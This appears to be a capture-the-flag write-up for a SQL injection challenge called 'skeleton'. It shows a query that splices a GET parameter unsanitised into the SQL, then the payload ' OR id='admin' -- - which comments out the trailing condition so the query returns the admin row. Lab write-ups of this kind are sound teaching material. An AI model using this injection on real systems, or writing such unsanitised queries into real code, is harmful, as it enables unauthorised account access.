---
custom_edit_url: null
sidebar_position: 10
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/4baddc49-08d9-4c11-a1da-59d9e17e5687)

We are provided with the SQL query:

```sql
SELECT id FROM prob_skeleton WHERE id='guest' AND pw='{$_GET[pw]}' AND 1=0
```

We can provide the following URI parameter:

```
?pw=' OR id='admin' -- -
```

The resultant query then becomes:

```sql
SELECT id FROM prob_skeleton WHERE id='guest' AND pw='' OR id='admin' -- -' AND 1=0

## Queried part:
SELECT id FROM prob_skeleton WHERE id='guest' AND pw='' OR id='admin'

## Commented part:
' AND 1=0
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/373ff0c7-ad97-4cd5-b184-95092bfb7d41)
